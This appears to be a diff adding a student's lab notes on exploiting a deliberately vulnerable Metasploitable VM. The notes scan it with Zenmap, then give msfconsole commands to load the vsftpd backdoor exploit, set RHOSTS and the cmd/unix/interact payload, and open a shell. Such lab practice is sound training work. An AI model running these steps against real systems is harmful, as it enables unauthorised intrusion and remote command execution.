@@ -1,0 +1,22 @@
+Download metasploit from github and then extract it
+open vmware and open a metasploit an power on this virtual machine
+it asks for admin and password:Give both as msfadmin
+type ifconfig in metasploit and know the inet address(1st one)
+copy inet address and paste in nmap zenmap tool and give it as target and select quick scan plus
+to exploit all the ports-here we use metasploit
+Now go to kali and type as follows-
+msfconsole
+To find the name of the exploit --->
+=>search vsftpd
+use this name of the exploit 
+use exploit/....backdoor
+info
+set RHOSTS ipaddress as metasploit ipaddress
+=>set RHOSTS <metasploit_ip>
+=>info
+=>show payloads
+payload/cmd/unix/interact
+=>set payload /cmd/unix/interact
+=>exploit
+ls
+search exploits port no. until we find sessions are opened
